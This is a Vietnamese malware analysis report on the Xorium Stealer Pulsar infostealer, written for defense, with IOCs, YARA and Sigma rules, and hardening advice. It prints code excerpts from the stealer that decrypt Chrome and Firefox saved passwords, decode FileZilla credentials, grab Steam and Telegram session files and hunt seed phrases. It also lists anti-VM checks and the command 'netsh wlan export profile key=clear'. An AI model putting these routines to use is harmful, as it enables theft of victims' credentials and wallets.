# BÁO CÁO TỔNG HỢP PHÂN TÍCH MÃ ĐỘC XORIUM STEALER PULSAR

> **Báo cáo toàn diện - Tất cả trong một**  
> **Phiên bản**: 1.0  
> **Ngày**: 31/01/2026  
> **Người phân tích**: Malware Analyst  
> **Mức độ**: Tuyệt mật - Nghiên cứu & Phòng thủ

---

## MỤC LỤC

1. [Tổng quan](#1-tổng-quan)
2. [Kiến trúc Hệ thống](#2-kiến-trúc-hệ-thống)
3. [Các Mục tiêu Thu thập](#3-các-mục-tiêu-thu-thập)
4. [Cơ chế Mã hóa & Giải mã](#4-cơ-chế-mã-hóa--giải-mã)
5. [SQLite Parser Tùy chỉnh](#5-sqlite-parser-tùy-chỉnh)
6. [File Grabber & Seed Hunter](#6-file-grabber--seed-hunter)
7. [Danh sách Trình duyệt](#7-danh-sách-trình-duyệt)
8. [Windows APIs](#8-windows-apis)
9. [Anti-VM & Anti-Analysis](#9-anti-vm--anti-analysis)
10. [Modules Đặc biệt](#10-modules-đặc-biệt)
11. [IOCs](#11-iocs)
12. [Phân tích Điểm yếu](#12-phân-tích-điểm-yếu)
13. [YARA & Sigma Rules](#13-yara--sigma-rules)
14. [Biện pháp Phòng thủ](#14-biện-pháp-phòng-thủ)
15. [Kết luận](#15-kết-luận)

---

## 1. TỔNG QUAN

### 1.1 Thông tin cơ bản

| Thuộc tính | Giá trị |
|------------|---------|
| **Tên** | Xorium Stealer Pulsar (Intelix Stealer) |
| **Phiên bản** | 2.1.0 (Client), 2.0.0 (Server) |
| **Ngôn ngữ** | C# (.NET Framework 4.7.2) |
| **Kiến trúc** | Plugin cho Pulsar RAT Framework |
| **Tác giả** | @aesxor / dead artis |
| **Mục đích** | Information Stealer |
| **Số file .cs** | 114+ |
| **Số modules** | 70+ targets |

### 1.2 Cấu trúc dự án

```
Xorium Stealer Pulsar/
├── Pulsar.Plugin.Client/          # 114+ file .cs
│   ├── Intelix/Helper/            # 40+ helper classes
│   │   ├── Encrypted/             # 15+ crypto classes
│   │   ├── Sql/                   # SQLite & BerkeleyDB
│   │   ├── Hashing/               # PBKDF2, PBE
│   │   └── Data/                  # InMemoryZip, Counter, Paths
│   ├── Intelix/Targets/           # 70+ target modules
│   │   ├── Browsers/              # Chromium, Gecko, Crypto
│   │   ├── Messangers/            # 12 messengers
│   │   ├── Games/                 # 10 game platforms
│   │   ├── Vpn/                   # 16 VPN clients
│   │   ├── Crypto/                # Desktop + Grabber
│   │   ├── Device/                # System info, WiFi, Screenshot
│   │   └── Applications/          # 20+ FTP/Remote/Dev apps
│   └── Pulsar/Plugins/Client/     # Entry point
├── Pulsar.Plugin.Server/          # Server control plugin
└── Documentation/                 # README, REPORT, DEFENSIVE
```

---

## 2. KIẾN TRÚC HỆ THỐNG

### 2.1 Interface Design (ITarget)

```csharp
public interface ITarget
{
    void Collect(InMemoryZip zip, Counter counter);
}
```

**Ưu điểm:**
- Dễ dàng thêm target mới
- Parallel processing đồng nhất
- Thread-safe với Concurrent collections

### 2.2 Plugin Architecture

**Client Plugin** (`Stealer.cs`):
- Implement `IUniversalPlugin`
- PluginId: "stealer_plugin"
- Version: "2.1.0"
- SupportedCommands: ["collect"]

**Server Plugin** (`ArchiveCollectorServer.cs`):
- Implement `IServerPlugin`
- Tích hợp context menu Pulsar RAT
- Quản lý config Discord/Telegram
- Nhận response và lưu file ZIP

### 2.3 Luồng hoạt động

1. **Server Plugin** (`Stealer.Server.dll`) được tải vào Pulsar RAT
2. Operator chọn client và gửi lệnh "Run Stealer"
3. Server đẩy `Stealer.Client.dll` xuống máy nạn nhân
4. Client thực thi, thu thập dữ liệu và gửi về qua:
   - Discord Webhook
   - Telegram Bot API
   - Trực tiếp về Pulsar Server

---

## 3. CÁC MỤC TIÊU THU THẬP

### 3.1 Trình duyệt (84+ browsers)

**Chromium-based (66):**
Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, Yandex, CocCoc, 360Chrome, 360Browser, CentBrowser, Comodo Dragon, Epic Privacy, Avast Browser, CCleaner, Torch, Uran, Iridium, Maxthon, Slimjet, Nichrome, Chromodo, QIP Surf, Chromium, BitTorrent Maelstrom, Globus VPN, Amigo, 7Star, Mail.Ru Atom, UCBrowser, Coowon, AOL Shield, Element Browser, Sputnik, Elements Browser, Tencent QQBrowser, Naver Whale, Baidu Browser, CatalinaGroup Citrio, MapleStudio ChromePlus, NVIDIA GeForce Experience, Sleipnir ChromiumViewer, Falkon, Hola, GhostBrowser, Colibri, Min, Kinza, Blisk, Xvast, CryptoTab, Kometa, liebao, Chedot, K-Melon, Orbitum, Lulumi, kingpin, Battle.net

**Gecko-based (18):**
Firefox, Waterfox, Thunderbird, Pale Moon, SeaMonkey, K-Meleon, IceDragon, Cyberfox, BlackHawk, Mypal, Ghostery, Undetectable, Sielo, conkeror, Netscape, SlimBrowser, Avant, Flock

**Dữ liệu thu thập:**
- Lịch sử duyệt web
- Cookies (bao gồm session cookies)
- Saved passwords (giải mã từ DPAPI)
- Credit cards (giải mã)
- AutoFill data
- Tokens xác thực

### 3.2 Ứng dụng Nhắn tin (12)

Discord, Telegram, Signal, Skype, Viber, Element (Riot.im), ICQ, Pidgin, Tox, Outlook, MicroSIP, Jabber

### 3.3 Nền tảng Game (10)

Steam, Epic Games, Battle.net, Riot Games (Valorant, LoL), Roblox, Minecraft, Uplay (Ubisoft), Xbox, Growtopia, Electronic Arts

### 3.4 VPN Clients (16)

NordVPN, ExpressVPN, ProtonVPN, CyberGhost, Mullvad, PIA (Private Internet Access), OpenVPN, WireGuard, SoftEther, Hamachi, RadminVPN, SurfShark, IPVanish, HideMyName, Cisco AnyConnect, Proxifier

### 3.5 Ví Tiền điện tử (40+)

**Desktop:** Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum, AtomicWallet, Atomic, Guarda, Coinomi, Tari, Bitcoin, Dash, Litecoin, MyMonero, Monero, Vertcoin, Groestlcoin, Komodo, PIVX, BitcoinGold, Electrum-LTC, Binance, Phantom, Coin98, MathWallet, LedgerLive, TrezorSuite, MyEtherWallet, MyCrypto, MetaMask Desktop, TrustWallet

**Browser Extensions:** MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet, Ronin Wallet, Brave Wallet, TronLink, Yoroi, Nami, Math Wallet, XDEFI, Guarda, Equal, BitAppWallet, iWallet, Wombat, AtomicNFT, MewCx, GuildWallet, Saturn, Ronin

### 3.6 Thông tin Hệ thống

SystemInfo, ScreenShot, ProcessDump, ProductKey, WifiKey, InstalledPrograms, InstalledBrowsers

### 3.7 Ứng dụng Khác (20+)

**Remote Access:** AnyDesk, TeamViewer, RDP, RDCMan, Sunlogin, MobaXterm, Xmanager, PuTTY

**FTP/SCP:** FileZilla, WinSCP, CyberDuck, CoreFTP, FTPNavigator, FTPRush, FTPGetter, FTPCommander, TotalCommander

**Development:** JetBrains IDEs, GitHub Desktop, Ngrok, Navicat, No-IP, DynDNS, OBS, TeamSpeak, PlayIt

---

## 4. CƠ CHẾ MÃ HÓA & GIẢI MÃ

### 4.1 Danh sách 15+ Thuật toán

| # | Thuật toán | File | Mục đích |
|---|-----------|------|----------|
| 1 | **DPAPI** | `DpApi.cs` | Giải mã Windows protected data |
| 2 | **AES-GCM-256** | `AesGcm.cs`, `AesGcm256.cs` | Chrome v10/v20 decryption |
| 3 | **ChaCha20-Poly1305** | `ChaCha20Poly1305.cs` | Modern browser encryption |
| 4 | **TripleDES-CBC** | `TripleDes.cs` | Firefox password decryption |
| 5 | **NSS Decryptor** | `NSSDecryptor.cs` | Legacy Firefox support |
| 6 | **PBKDF2** | `PBKDF2.cs` | Key derivation |
| 7 | **PBE** | `PBE.cs` | Firefox key4.db |
| 8 | **Blowfish** | `Blowfish.cs` | Symmetric encryption |
| 9 | **RC4** | `RC4Crypt.cs` | Stream cipher |
| 10 | **AES-CBC-256** | `AesGcm256.cs` | General purpose |
| 11 | **HMAC-SHA1** | `TripleDes.cs` | Message authentication |
| 12 | **SHA1** | `TripleDes.cs` | Hashing |
| 13 | **XOR Cipher** | `Xor.cs` | Simple obfuscation |
| 14 | **CNG** | `CngDecryptor.cs` | Windows CNG API |
| 15 | **ASN.1 DER** | `Asn1Der.cs` | Parse certificate data |

### 4.2 DPAPI Implementation

```csharp
[DllImport("crypt32.dll", SetLastError = true)]
public static extern bool CryptUnprotectData(
    ref DataBlob pDataIn,
    ref string szDataDescr,
    ref DataBlob pOptionalEntropy,
    IntPtr pvReserved,
    ref CryptprotectPromptstruct pPromptStruct,
    int dwFlags,
    ref DataBlob pDataOut);
```

### 4.3 AES-GCM-256 (Chrome Decryption)

**Cấu trúc dữ liệu mã hóa:**
```
[0-2]   Version prefix: "v10" hoặc "v20"
[3-14]  12-byte nonce/IV
[15-n]  Ciphertext
[n-16:n] 16-byte authentication tag (GCM)
```

**Quy trình giải mã:**
```csharp
public static byte[] DecryptBrowser(byte[] encryptedData, byte[] masterKey10, byte[] masterKey20, bool checkprefix)
{
    string version = Encoding.ASCII.GetString(encryptedData, 0, 3);
    byte[] nonce = new byte[12];
    Buffer.BlockCopy(encryptedData, 3, nonce, 0, 12);
    
    int ciphertextLength = encryptedData.Length - 15 - 16;
    byte[] ciphertext = new byte[ciphertextLength];
    byte[] tag = new byte[16];
    
    byte[] key = version == "v20" ? masterKey20 : masterKey10;
    return AesGcm256.Decrypt(key, nonce, null, ciphertext, tag);
}
```

### 4.4 TripleDES-CBC (Firefox)

**Key Derivation từ key4.db:**
```csharp
// Bước 1: SHA1(globalSalt + masterPassword)
byte[] combined = new byte[globalSalt.Length + masterPassword.Length];
Array.Copy(globalSalt, 0, combined, 0, globalSalt.Length);
Array.Copy(masterPassword, 0, combined, globalSalt.Length, masterPassword.Length);
byte[] hash1 = SHA1.ComputeHash(combined);

// Bước 2: SHA1(hash1 + entrySalt)
byte[] combined2 = new byte[hash1.Length + entrySalt.Length];
Array.Copy(hash1, 0, combined2, 0, hash1.Length);
Array.Copy(entrySalt, 0, combined2, hash1.Length, entrySalt.Length);
byte[] hash2 = SHA1.ComputeHash(combined2);

// Bước 3: HMAC-SHA1 để tạo key và IV
using (HMACSHA1 hmac = new HMACSHA1(hash2))
{
    byte[] hash3 = hmac.ComputeHash(paddedEntrySalt);
    byte[] hash4 = hmac.ComputeHash(...);
    
    this.Key = new byte[24];  // 3DES key
    this.Vector = new byte[8];  // CBC IV
}
```

### 4.5 ChaCha20-Poly1305

```csharp
public static byte[] Decrypt(byte[] key32, byte[] iv12, byte[] ciphertext, byte[] tag, byte[] aad)
{
    byte[] src = ChaCha20Block(key32, 0U, iv12);
    byte[] numArray = new byte[32];
    Buffer.BlockCopy(src, 0, numArray, 0, 32);
    
    byte[] msg = BuildPoly1305Message(aad, ciphertext);
    if (!FixedTimeEquals(Poly1305TagWithBigInteger(numArray, msg), tag))
    {
        Array.Clear(src, 0, src.Length);
        Array.Clear(numArray, 0, numArray.Length);
        throw new CryptographicException("ChaCha20-Poly1305 authentication failed");
    }
    
    byte[] output = new byte[ciphertext.Length];
    ChaCha20Xor(key32, 1U, iv12, ciphertext, output);
    Array.Clear(src, 0, src.Length);
    Array.Clear(numArray, 0, numArray.Length);
    return output;
}
```

---

## 5. SQLITE PARSER TÙY CHỈNH

### 5.1 Kiến trúc

```csharp
public class SqLite
{
    private readonly byte[] _fileBytes;
    private readonly ulong _pageSize;
    private readonly ulong _dbEncoding;
    private SqliteMasterEntry[] _masterTableEntries;
    private TableEntry[] _tableEntries;
    
    public SqLite(byte[] basedata)
    {
        _fileBytes = basedata;
        _pageSize = ConvertToULong(16, 2);    // Offset 16-17
        _dbEncoding = ConvertToULong(56, 4);  // Offset 56-59
        ReadMasterTable(100L);
    }
}
```

### 5.2 SQLite File Format Header

| Offset | Size | Description |
|--------|------|-------------|
| 0-15 | 16 | Header string: "SQLite format 3\0" |
| 16-17 | 2 | Page size (big-endian) |
| 56-59 | 4 | Database text encoding |

### 5.3 Các Table được Parse

| Database | Table | Dữ liệu |
|----------|-------|---------|
| `Login Data` | `logins` | Username, password, URL |
| `Cookies` | `cookies` | Name, value, domain |
| `Web Data` | `autofill` | Form data, addresses |
| `Web Data` | `credit_cards` | Card number, expiry |
| `Web Data` | `token_service` | OAuth tokens |
| `Ya Passman Data` | `logins` | Yandex passwords |

### 5.4 Ưu điểm

1. Không cần lock file
2. Bypass file locking
3. Không cần dependencies
4. Stealth - Không tạo connection strings

---

## 6. FILE GRABBER & SEED HUNTER

### 6.1 Keywords (35 từ)

```csharp
private readonly string[] _keywords = new string[35]
{
    "password", "passwd", "pwd", "pass", "login", "user", "username",
    "account", "mail", "email", "secret", "key", "private", "public",
    "wallet", "mnemonic", "seed", "recovery", "phrase", "backup",
    "pin", "auth", "2fa", "token", "apikey", "api_key", "ssh",
    "cert", "certificate", "crypto", "btc", "eth", "usdt", "ltc", "xmr"
};
```

### 6.2 Seed Phrase Regex (BIP-39)

```csharp
private readonly Regex _seedRegex = new Regex(
    "^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$",
    RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);
```

### 6.3 File Extensions

```csharp
private readonly string[] _seedExtensions = new string[9]
{
    ".seed", ".seedphrase", ".mnemonic", ".phrase", ".key",
    ".secret", ".txt", ".backup", ".wallet"
};
```

### 6.4 Search Paths (19 locations)

Desktop, Documents, Downloads, OneDrive, Dropbox, iCloud Drive, Google Drive, YandexDisk, Mega, Evernote, Standard Notes, Joplin, Wallets, Keys, Crypto, Backup folders

### 6.5 Size Limits

```csharp
private readonly long _sizeMinFile = 120;      // Min: 120 bytes
private readonly long _sizeLimitFile = 6144;   // Max per file: 6KB
private readonly long _sizeLimit = 5242880;    // Total: 5MB
```

---

## 7. DANH SÁCH TRÌNH DUYỆT

### 7.1 Chromium-based (66 browsers)

| # | Browser | Path |
|---|---------|------|
| 1 | Google Chrome | `\Google\Chrome\User Data` |
| 2 | Microsoft Edge | `\Microsoft\Edge\User Data` |
| 3 | Brave | `\BraveSoftware\Brave-Browser\User Data` |
| 4 | Opera | `\Opera Software\Opera Stable` |
| 5 | Opera GX | `\Opera Software\Opera GX Stable` |
| 6 | Vivaldi | `\Vivaldi\User Data` |
| 7 | Yandex | `\Yandex\YandexBrowser\User Data` |
| 8 | CocCoc | `\CocCoc\Browser\User Data` |
| 9 | 360Chrome | `\360Chrome\Chrome\User Data` |
| 10 | 360Browser | `\360Browser\Browser\User Data` |
| ... | 56+ others | Various paths |

### 7.2 Gecko-based (18 browsers)

| # | Browser | Path |
|---|---------|------|
| 1 | Firefox | `\Mozilla\Firefox\Profiles` |
| 2 | Waterfox | `\Waterfox\Profiles` |
| 3 | Thunderbird | `\Thunderbird\Profiles` |
| 4 | Pale Moon | `\Moonchild Productions\Pale Moon\Profiles` |
| 5 | SeaMonkey | `\Mozilla\SeaMonkey\Profiles` |
| ... | 13+ others | Various paths |

---

## 8. WINDOWS APIs

### 8.1 Process & Memory APIs

```csharp
[DllImport("psapi.dll")]
public static extern bool GetProcessMemoryInfo(...);

[DllImport("psapi.dll")]
public static extern bool EnumProcesses(...);

[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(...);

[DllImport("kernel32.dll")]
public static extern bool TerminateProcess(...);
```

### 8.2 DPAPI & Cryptography APIs

```csharp
[DllImport("crypt32.dll")]
public static extern bool CryptUnprotectData(...);

[DllImport("ncrypt.dll")]
public static extern int NCryptOpenStorageProvider(...);

[DllImport("ncrypt.dll")]
public static extern int NCryptDecrypt(...);
```

### 8.3 System Information APIs

```csharp
[DllImport("kernel32.dll")]
public static extern bool GetVolumeInformation(...);

[DllImport("kernel32.dll")]
public static extern bool GlobalMemoryStatusEx(...);

[DllImport("user32.dll")]
public static extern bool EnumDisplayDevices(...);
```

---

## 9. ANTI-VM & ANTI-ANALYSIS

### 9.1 Các kiểm tra (8 checks)

```csharp
public static void CheckOrExit()
{
    if (ProccessorCheck()) throw new Exception();      // CPU <= 1 core
    if (CheckDebugger()) throw new Exception();        // Debugger.IsAttached
    if (CheckMemory()) throw new Exception();          // RAM < 2GB
    if (CheckDriveSpace()) throw new Exception();      // Disk < 50GB
    if (CheckUserConditions()) throw new Exception();  // Sandbox usernames
    if (CheckCache()) throw new Exception();           // No cache memory
    if (CheckFileName()) throw new Exception();        // "sandbox" in name
    if (CheckCim()) throw new Exception();             // No CIM memory
}
```

### 9.2 Hardcoded Usernames (Chỉ 3 patterns!)

```csharp
// Windows Defender Application Guard
"WDAGUtilityAccount"

// Sandbox patterns
("frank" + "desktop")
("robert" + "22h2")
```

### 9.3 Process Killer (65 targets)

```csharp
string[] Targets = new string[65]
{
    "thunderbird.exe", "icedragon.exe", "cyberfox.exe", "chrome.exe",
    "opera.exe", "operagx.exe", "msedge.exe", "brave.exe", "vivaldi.exe",
    "steam.exe", "telegram.exe", ...
};
```

---

## 10. MODULES ĐẶC BIỆT

### 10.1 SystemInfo

**6 sections song song:**
```csharp
Task<string> task1 = Task.Run(() => BuildUserSection());      // User, Machine, HWID
Task<string> task2 = Task.Run(() => BuildNetworkSection());   // IP, MAC
Task<string> task3 = Task.Run(() => BuildSystemSection());    // OS, CPU, RAM
Task<string> task4 = Task.Run(() => BuildDrivesSection());    // Disk info
Task<string> task5 = Task.Run(() => BuildGpuSection());       // GPU
Task<string> task6 = Task.Run(() => BuildBasicSection());     // Basic info
```

**HWID Generation:**
```csharp
values.Add("MG:" + GetMachineGuid());
values.Add("CPU:" + GetCpuName());
values.Add("VOLS:" + GetFixedVolumeSerials());
values.Add("MACS:" + GetMacAddresses());
_hwid = ComputeSha256(string.Join("|", values));
```

### 10.2 ScreenShot

- Desktop capture bằng BitBlt
- Watermark "Xorium" với gradient tím-xanh
- Multi-monitor support

### 10.3 Telegram

**Tdata Folder Analysis:**
```csharp
Parallel.ForEach(FindAllMatches("tdata"), tdata =>
{
    string targetPath = Path.GetFileName(tdata.Remove(tdata.Length - 6, 6)) + GenerateHashTag();
    Copydata(tdata, targetPath, zip, counter);
});
```

**File patterns:**
- 17 chars ending with 's' (session files)
- usertag, settings, key_data, configs, maps

### 10.4 Steam

**SSFN Files (Steam Guard):**
```csharp
foreach (string file in Directory.GetFiles(steamPath))
{
    if (file.Contains("ssfn"))
    {
        byte[] content = File.ReadAllBytes(file);
        zip.AddFile($"Steam\ssfn\{Path.GetFileName(file)}", content);
    }
}
```

**Config Files (VDF):**
- loginusers.vdf
- config.vdf
- steamapps.vdf

### 10.5 FileZilla

**XML Parsing:**
```csharp
XmlDocument xmlDocument = new XmlDocument();
xmlDocument.Load(configFile);

foreach (XmlNode xmlNode in xmlDocument.GetElementsByTagName("Server"))
{
    string encodedPass = xmlNode?["Pass"]?.InnerText;
    string password = Encoding.UTF8.GetString(Convert.FromBase64String(encodedPass));
    string url = $"ftp://{xmlNode["Host"]?.InnerText}:{xmlNode["Port"]?.InnerText}/";
}
```

---

## 11. IOCs

### 11.1 File Paths

```
%APPDATA%\pulsar_cl_conf.bin
%TEMP%\IntelixWifiExport_*
%TEMP%\{Username}_{ComputerName}_*.zip
```

### 11.2 Registry Keys

```
HKCU\Software\Valve\Steam\SteamPath
HKCU\Software\Pulsar
HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid
```

### 11.3 Network Indicators

```
http://icanhazip.com
https://discord.com/api/webhooks/*
https://api.telegram.org/bot*/sendDocument
https://accounts.google.com/oauth/multilogin
```

### 11.4 Process Indicators

```
netsh wlan export profile key=clear
```

### 11.5 Strings

```
"InteliX by dead artis"
"Xorium"
"coded by @aesxor"
"Stealerv37"
```

---

## 12. PHÂN TÍCH ĐIỂM YẾU

### 12.1 Điểm yếu Anti-VM

| Kiểm tra | Điểm yếu | Cách bypass |
|----------|----------|-------------|
| CPU <= 1 | Chỉ check số core | VM có 2+ cores |
| Debugger.IsAttached | Dễ hook | ScyllaHide |
| RAM < 2GB | Check đơn giản | VM có 4GB+ |
| Disk < 50GB | Check C: drive | VM với 100GB+ |
| Hardcoded users | Chỉ 3 usernames | Đổi tên user |
| WMI queries | Dễ spoof | Hook COM |

### 12.2 Cơ hội Phát hiện

1. **Mass process termination** - 65 processes dễ detect
2. **WMI queries đặc trưng** - Dấu vết trong logs
3. **File access patterns** - 50+ sensitive files
4. **Network IOCs cố định** - Discord/Telegram APIs
5. **Hardcoded strings** - Dễ YARA detection

### 12.3 Forensic Artifacts

- `IntelixWifiExport_*` folders
- `*.zip` files trong %TEMP%
- `counter.txt` với ASCII art
- Memory strings: "Xorium", "InteliX"

---

## 13. YARA & SIGMA RULES

### 13.1 YARA Rule - Xorium Strings

```yara
rule Xorium_Stealer_Strings
{
    meta:
        description = "Detects Xorium Stealer by unique strings"
        author = "Malware Analyst"
        date = "2026-01-31"
    
    strings:
        $str1 = "InteliX by dead artis" ascii wide
        $str2 = "Xorium" ascii wide
        $str3 = "coded by @aesxor" ascii wide
        $str4 = "Stealerv37" ascii wide
        $str5 = "IntelixWifiExport" ascii wide
        
        $anti1 = "WDAGUtilityAccount" ascii wide
        $anti2 = "frank" ascii wide
        $anti3 = "robert" ascii wide
    
    condition:
        uint16(0) == 0x5A4D and
        (2 of ($str*) or (1 of ($str*) and 2 of ($anti*)))
}
```

### 13.2 YARA Rule - Process Killer

```yara
rule Xorium_Process_Killer
{
    meta:
        description = "Detects Xorium process termination list"
        author = "Malware Analyst"
    
    strings:
        $proc_list = "thunderbird.exe" ascii wide
        $p1 = "icedragon.exe" ascii wide
        $p2 = "cyberfox.exe" ascii wide
        $p3 = "chrome.exe" ascii wide
        $p4 = "opera.exe" ascii wide
        $p5 = "telegram.exe" ascii wide
    
    condition:
        uint16(0) == 0x5A4D and
        $proc_list and 5 of ($p*)
}
```

### 13.3 Sigma Rule - Mass Process Termination

```yaml
title: Xorium Stealer - Mass Browser Process Termination
logsource:
    category: process_termination
    product: windows
detection:
    selection:
        TargetImage|endswith:
            - '\chrome.exe'
            - '\firefox.exe'
            - '\opera.exe'
            - '\msedge.exe'
            - '\telegram.exe'
            - '\steam.exe'
    timeframe: 30s
    condition: selection | count() > 5
level: high
```

### 13.4 Sigma Rule - WiFi Export

```yaml
title: Xorium Stealer - WiFi Password Export
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'netsh'
            - 'wlan'
            - 'export'
            - 'profile'
            - 'key=clear'
    condition: selection
level: high
```

---

## 14. BIỆN PHÁP PHÒNG THỦ

### 14.1 User-Level

1. **Password Manager** - Dùng Bitwarden, 1Password, KeePass
2. **Tắt AutoFill** - Chrome/Edge Settings > Autofill > OFF
3. **2FA/MFA** - Bật cho tất cả tài khoản
4. **Hardware Wallet** - Ledger, Trezor cho crypto

### 14.2 Enterprise-Level

1. **EDR** - CrowdStrike, SentinelOne, MDE
2. **Application Control** - AppLocker, WDAC
3. **Network Monitoring** - Giám sát Discord/Telegram APIs
4. **ASR Rules** - Enable Windows Defender ASR

### 14.3 Technical Controls

```powershell
# Disable browser password saving
Computer Configuration > Administrative Templates > Google Chrome
- "Password manager" = Disabled

# Block Discord webhooks
New-NetFirewallRule -DisplayName "Block Discord Webhooks" 
    -Direction Outbound -RemoteAddress "162.159.0.0/16" -Action Block

# Monitor netsh wlan export
auditpol /set /subcategory:"Process Creation" /success:enable
```

### 14.4 Browser Hardening

**Firefox policies.json:**
```json
{
  "policies": {
    "PasswordManagerEnabled": false,
    "AutofillCreditCardEnabled": false
  }
}
```

---

## 15. KẾT LUẬN

### 15.1 Đánh giá mức độ nguy hiểm

| Tiêu chí | Mức độ |
|----------|--------|
| **Phổ biến** | Cao |
| **Khả năng lây nhiễm** | Trung bình |
| **Mức độ thiệt hại** | Rất cao |
| **Khó phát hiện** | Trung bình |
| **Khó gỡ bỏ** | Thấp |

### 15.2 Đặc điểm nổi bật

**Điểm mạnh:**
1. Kiến trúc modular - Dễ mở rộng
2. 15+ thuật toán mã hóa
3. SQLite tùy chỉnh - Bypass file locking
4. Parallel processing - Tốc độ nhanh
5. 84+ browsers, 40+ wallets

**Điểm yếu:**
1. Anti-VM yếu - Chỉ 3 usernames
2. Hardcoded strings - Dễ detect
3. Không obfuscation - Code rõ ràng
4. Mass process termination - Dễ phát hiện
5. Không persistence mạnh

### 15.3 Tóm tắt IOCs chính

```
Files: %TEMP%\Intelix*, %TEMP%\*Xorium*.zip
Registry: HKCU\Software\Pulsar
Network: discord.com/api/webhooks/*, api.telegram.org/bot*/sendDocument
Strings: "InteliX by dead artis", "Xorium", "Stealerv37"
Processes: netsh wlan export profile key=clear
```

### 15.4 Khuyến nghị

**Người dùng cá nhân:**
- Dùng password manager
- Bật 2FA cho tất cả accounts
- Hardware wallet cho crypto
- Không lưu password trong browser

**Doanh nghiệp:**
- Deploy YARA rules để scan
- Enable Sigma rules cho behavioral detection
- Block Discord/Telegram webhooks tại firewall
- Implement browser hardening GPOs
- User training về phishing

---

**END OF COMPREHENSIVE REPORT**

*Báo cáo tổng hợp này bao gồm tất cả các khía cạnh phân tích mã độc Xorium Stealer Pulsar.*

**Tài liệu liên quan:**
- README.md - Tổng quan
- REPORT.md - Phân tích kỹ thuật sâu
- ULTRA_DEEP_ANALYSIS.md - Phân tích cực sâu
- DEFENSIVE_ANALYSIS.md - Phân tích phòng thủ

**Repository:** https://github.com/Trongdepzai-dev/Xorium-Stealer-Pulsar
